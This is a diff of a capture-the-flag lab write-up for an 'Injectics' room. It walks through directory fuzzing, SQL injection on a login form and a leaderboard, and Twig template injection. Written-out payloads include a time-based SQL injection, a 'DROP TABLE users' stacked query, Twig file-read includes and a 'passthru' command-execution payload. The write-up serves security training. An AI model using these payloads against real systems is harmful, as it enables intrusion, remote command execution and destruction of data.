@@ -4,25 +4,35 @@
 
 ### Initial enumeration
 
+#### Zed Attack Proxy (ZAP)
+
+From ZAP, I found the hidden directory `composer.lock`. I found out the application uses _Twig v2.14.0:_
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
 #### Basic fuzzing:
+
+In an attempt to discover more directories, I decided to perform a directory discovery using _**gobuster**_. I included common extensions such as `.php`, `.lock` and `.json`.
 
 {% code overflow="wrap" %}
 ```bash
-$ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+$ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,json,lock
 ```
 {% endcode %}
 
-...
+Interesting file found: `composer.json` . The content of the file confirms the presence of Twig:
 
-Interesting files: `composer.lock`, `composer.json`
-
-From `composer.json`, I found out that the application uses Twig.
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 #### Source code review
 
-... found file `mail.log`&#x20;
+I found the following comments at the bottom of the source code of the `/` page:
 
-```
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+After navigating to the `mail.log` file, I found the following note:
+
+```log
 From: dev@injectics.thm
 To: superadmin@injectics.thm
 Subject: Update before holidays
@@ -49,7 +59,7 @@ dev@injectics.thm
 
 ```
 
-From this note, we can understand that ...
+From this note, we can understand that default credentials will be added to the `users` table in the event that it gets corrupted or deleted. Hmm, this seems to give us a hint that we need to somehow alter or drop this table.
 
 ### Exploring the application
 
@@ -157,7 +167,7 @@ $ sqlmap -r login.txt --risk=3 --level=5
 I found that the following payload to the username field works too:
 
 ```sql
-' RLIKE SLEEP(3) -- n 
+' RLIKE SLEEP(3) -- // explicit space after the comment (--) 
 ```
 
 #### (2) Edit leader board
@@ -189,12 +199,12 @@ rank=1&country=1&gold=1&silver=1&bronze=1
 UPDATE table SET gold = x, silver = x, bronze = x WHERE rank = x;
 ```
 
-**ATTEMPT 1**
+**Injection 1**
 
 Injection to the `gold` field:
 
 ```sql
-22, silver = 22, bronze = 22;-- // explicit space after comment
+22, silver = 22, bronze = 22;-- // explicit space after comment (--)
 ```
 
 ```sql
@@ -203,7 +213,9 @@ UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x 
 
 * This action will update the `gold`, `silver` and `bronze` field to **22** for every country. With that, we know that the SQL injection worked!
 
-**ATTEMPT 2**
+**Injection 2**
+
+Now that we have confirmed that we can perform an SQL injection attack, we can attempt to drop the `user` table again.
 
 ```sql
 1 WHERE 1=1; DROP TABLE users;-- 
@@ -212,17 +224,10 @@ UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x 
 {% code overflow="wrap" %}
 ```sql
 UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id = x;, silver = x, bronze = x WHERE id = x;
-
 ```
 {% endcode %}
 
-**Further learning**
-
-Sqlmap:&#x20;
-
-```sh
-$ sqlmap -r leaderboard.txt -p gold,silver,bronze --dbms=mysql 
-```
+When we navigate back to the GUI, we are presented with a note that the database is down.Success!
 
 ### SSTI injection on the admin profile page
 
@@ -259,6 +264,18 @@ From the `composer.json` file, we know that the application uses _**Twig**_ as t
 
 I tried a few payloads I have found from multiple sources (refer to references below):
 
+**CVE-2022-39261**
+
+I found a CVE related to _Twig v2.14.0_.
+
+{% embed url="https://github.com/twigphp/Twig/security/advisories/GHSA-52m2-vc4m-jj33" %}
+
+```twig
+{{ include('@null/index.php') }}
+{% include('@null/index.php') %}
+{{ source('@null/index.php') }}
+```
+
 **File read**
 
 ```twig
@@ -285,7 +302,7 @@ I tried a few payloads I have found from multiple sources (refer to references b
 {{['id',""]|sort('passthru')}} 
 ```
 
-The payloads above doesn't seem to work. Finally, the following finally worked after a few iterations:
+The payloads above doesn't seem to work. Finally, I found a working payload after a few iterations:
 
 ```twig
 {{['id',""]|sort('passthru')}} 
